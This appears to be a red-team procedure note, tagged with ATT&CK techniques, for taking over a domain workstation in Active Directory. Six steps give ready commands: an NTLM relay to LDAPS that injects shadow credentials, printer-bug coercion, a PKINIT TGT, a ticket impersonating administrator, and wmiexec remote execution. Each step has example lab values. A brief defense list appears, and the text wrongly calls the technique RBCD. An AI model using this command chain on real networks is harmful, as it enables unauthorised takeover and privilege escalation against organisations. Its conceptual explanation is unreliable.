---
type: procedure
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
  - >-
    [[techniques/Use Alternate Authentication Material|T1550 - Use Alternate
    Authentication Material]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets/Forge Kerberos
    Tickets|T1558.002]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Shadow Credentials]]'
  - rbcd
  - ntlm-relay
  - kerberos
commands:
  - '[[commands/ntlmrelayx-relay-to-ldaps-for-shadow-credentials]]'
  - '[[commands/printer-bug-trigger-authentication]]'
  - '[[commands/gettgtpkinit-using-certificate]]'
  - '[[commands/getst-for-target-account]]'
  - '[[commands/export-krb5ccname-and-wmiexec-kerberos-execution]]'
tools:
  - '[[tools/Impacket]]'
platforms:
  - Windows
  - Active Directory
skill_level: advanced
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Workstation-Takeover-with-RBCD

## Summary

This procedure demonstrates how to takeover a workstation account in an Active Directory environment by abusing Resource-Based Constrained Delegation (RBCD). It involves relaying NTLM authentication from a compromised workstation to a domain controller to inject shadow credentials, obtaining a certificate via PKINIT, requesting Kerberos tickets, and using them for remote execution and lateral movement.

## Description

Resource-Based Constrained Delegation (RBCD) allows service accounts to delegate authentication to other services they control. Attackers can abuse this by relaying NTLM authentication to add a certificate template to a target computer account (e.g., workstation), enabling the attacker to request Kerberos tickets as that account. This technique bypasses traditional delegation controls and allows takeover of the workstation for persistence or lateral movement. It requires a foothold on a domain-joined workstation with low-priv user creds and network access to the DC. The target environment is a Windows Active Directory domain with LDAP/LDAPS enabled. Expected outcomes include control over the target workstation as a domain user or admin if escalated.

## Requirements

1. Compromised low-privilege domain user credentials (e.g., matt:Password1) on a domain-joined workstation.
2. Network access to the domain controller (ports 445, 636 for LDAPS, 88 for Kerberos).
3. Installed tools: Impacket suite, proxychains for SOCKS proxy (if pivoting), Python 3.
4. Attacker machine with access to relay traffic (e.g., via C2 port forward on port 8081 to 81).
5. Domain admin or equivalent rights not required, but relay target must be modifiable (e.g., computer account).

## Defense

- Enable LDAP signing and channel binding to prevent NTLM relay attacks.
- Monitor for anomalous LDAPS connections and certificate requests via PKINIT.
- Restrict MS-DS-MachineAccountQuota to limit computer account modifications.
- Implement Protected Users group and disable RC4 encryption for Kerberos.
- Log and alert on Event ID 4769 (Kerberos service ticket requests) for unusual principals.
- Use tools like Microsoft ATA or ETW logging for delegation abuse detection.

## Objectives

1. Relay NTLM authentication to inject shadow credentials into target workstation account.
2. Obtain a certificate and TGT for the target workstation via PKINIT.
3. Request a service ticket (ST) for remote access to the target.
4. Execute commands on the target workstation using Kerberos authentication.
5. Achieve lateral movement and persistence as the workstation account.

## Instructions

### Step 1: Setup Reverse Port Forward for Relay Traffic

**Context**: If operating from a C2 framework (e.g., Cobalt Strike), configure a reverse port forward to route relay traffic from the compromised host (port 8081) to your attacker's HTTP listener (port 81). This enables the printer bug to trigger authentication through the proxy. Skip if directly accessible.

No specific command; configure in your C2 beacon or use SSH/SOCKS: `ssh -D 8081 user@compromised-host` or equivalent.

> This step ensures the relay server receives proxied authentication attempts. Expected: Port forward active, no errors in C2 logs.

### Step 2: Setup NTLM Relay for Shadow Credentials

**Context**: Start the NTLM relay server targeting LDAPS on the domain controller to abuse RBCD. When authentication is relayed, it will add shadow credentials (a certificate) to the target workstation computer account (e.g., WS2$). The HTTP port listens for the printer bug trigger.

**Command** ([[commands/ntlmrelayx-relay-to-ldaps-for-shadow-credentials]]):
```bash
proxychains python3 ntlmrelayx.py -t ldaps://$_TARGET_DC --shadow-credentials --shadow-target $_TARGET_COMPUTER$ --http-port $_HTTP_PORT
```

> Run this on the attacker machine before triggering authentication. Replace $_TARGET_DC with DC FQDN (e.g., dc1.ez.lab), $_TARGET_COMPUTER$ with target workstation (e.g., ws2$), $_HTTP_PORT with 81. Expected: Relay server starts listening on SMB/HTTP, outputs "Relay server is listening". When triggered, logs show successful relay, certificate injection, and file ws2.pfx saved.

### Step 3: Trigger Authentication with Printer Bug

**Context**: Use the printer bug (Spooler Service RPC) to force the target workstation to authenticate to the attacker's relay listener via the port forward. This coerces NTLM auth from the workstation user (e.g., matt) to the relay, enabling RBCD abuse.

**Command** ([[commands/printer-bug-trigger-authentication]]):
```bash
proxychains python3 printerbug.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_WORKSTATION $_RELAY_HOST@$_RELAY_PORT/file
```

> Execute from the compromised host or via proxy. Example: ez.lab/matt:Password1!@ws2.ez.lab ws1@8081/file. Expected: Printer bug sends RPC to target, triggers NTLM auth relay. Relay logs show incoming connection, hash relayed to DC, and shadow credential added.

### Step 4: Obtain TGT Using PKINIT Certificate

**Context**: Use the relayed certificate (saved as .pfx) to request a Ticket Granting Ticket (TGT) for the target computer account via PKINIT. This authenticates as the workstation without password.

**Command** ([[commands/gettgtpkinit-using-certificate]]):
```bash
proxychains python3 gettgtpkinit.py $_DOMAIN/$_COMPUTER$ $_CCACHE_FILE -cert-pfx $_CERT_PFX_PATH -pfx-pass $_PFX_PASSWORD
```

> Run after relay success. Example: ez.lab/ws2$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR. Expected: TGT saved to $_CCACHE_FILE (e.g., ws2.ccache), output confirms "Kerberos sessionfile saved".

### Step 5: Request Service Ticket for Target Account

**Context**: Using the TGT, request a service ticket (ST) for CIFS access to the target workstation, impersonating a high-priv user (e.g., administrator) if S4U2Self is possible, or directly for the computer.

**Command** ([[commands/getst-for-target-account]]):
```bash
proxychains python3 getST.py -spn cifs/$_TARGET_WORKSTATION.$_DOMAIN kerberos+ccache://$_DOMAIN\\$_COMPUTER$:$_CCACHE_FILE@$_TARGET_DC $_IMPERSONATE_USER@$_DOMAIN $_TGS_CCACHER -v
```

> Note: Original uses gets4uticket.py, aliased to getST.py in Impacket. Example: kerberos+ccache://ez.lab\ws2$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v. Expected: ST saved to $_TGS_CCACHER, output shows ticket details and success.

### Step 6: Execute Remote Commands with Kerberos Ticket

**Context**: Export the Kerberos credential cache and use it to execute commands on the target workstation via WMI, achieving takeover without passing hashes or passwords.

**Command** ([[commands/export-krb5ccname-and-wmiexec-kerberos-execution]]):
```bash
export KRB5CCNAME=$_TGS_CCACHER
proxychains python3 wmiexec.py -k -no-pass $_DOMAIN/$_TARGET_USER@$_TARGET_WORKSTATION
```

> Example: export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache; proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab. Expected: Interactive shell or command output from target, confirming access (e.g., whoami shows administrator).
